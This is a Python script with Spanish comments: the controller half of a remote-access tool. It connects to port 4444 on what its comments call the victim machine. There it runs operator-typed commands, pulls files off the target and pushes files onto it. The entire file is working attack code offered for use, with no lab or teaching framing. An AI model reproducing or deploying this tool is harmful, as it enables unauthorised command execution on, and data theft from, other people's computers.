from socket import socket 
from os import path



# Definimos la dirección y puerto del servidor (Siempre de la máquina víctima)
server_address = ("", 4444)  #pon  la ip victima

# Creamos el socket cliente, ya que restablecemos la conexión a cada comando que se ejecute
client_socket = socket()
client_socket.connect(server_address)
estado = True

while estado:

    # Solicitamos al usuario que introduzca un comando
    comando_enviar = input("Introduce el comando que quieras enviar a la máquina víctima (o 'exit' para salir): ")
    

    # Si el usuario introduce "exit", cerramos la conexión y salimos del bucle
    if comando_enviar == 'exit':
        # Le decimos al servidor que la conexion la cerramos:
        client_socket.send(comando_enviar.encode())
        # Cerramos el socket, que se volverá a abrir al inicio del bucle:
        client_socket.close()
        estado = False
    
    elif comando_enviar == 'descargar':
        # Solicitar al usuario que ingrese el nombre del archivo
        nombre_archivo = input("Introduce el nombre del archivo que deseas descargar: ")
        # Enviar el nombre del archivo al servidor
        client_socket.send(nombre_archivo.encode())
        # Recibir el archivo del servidor y guardarlo en el directorio actual
        with open(nombre_archivo, 'wb') as archivo_descargado:
            while True:
                datos = client_socket.recv(1024)
                if not datos:
                    break
                archivo_descargado.write(datos)
        print(f"Archivo {nombre_archivo} descargado exitosamente.") 
        
    elif comando_enviar == 'enviar':
        # Solicitar al usuario que ingrese el nombre del archivo
        nombre_archivo = input("Introduce el nombre del archivo que deseas enviar: ")
        if path.exists (nombre_archivo):
            try:
            # Abrir el archivo en modo lectura binaria
                with open(nombre_archivo, "rb") as f:
                # Leer el contenido del archivo
                    contenido = f.read()
            # Enviar el nombre del archivo al servidor
                client_socket.send(nombre_archivo.encode())
            # Enviar el contenido del archivo al servidor
                client_socket.send(contenido)
                print(f"Archivo {nombre_archivo} enviado exitosamente.")
            except FileNotFoundError:
            # Enviar un mensaje de error al cliente si el archivo no existe
                client_socket.send("El archivo no existe".encode())
            
    else:
        # Enviamos el comando a la máquina víctima:
        client_socket.send(comando_enviar.encode())

        # Esperamos a recibir la respuesta de la víctima y lo guardamos en la variable respuesta.
        respuesta = client_socket.recv(4096)

        # Imprimimos la respuesta;
        print(respuesta.decode()) 
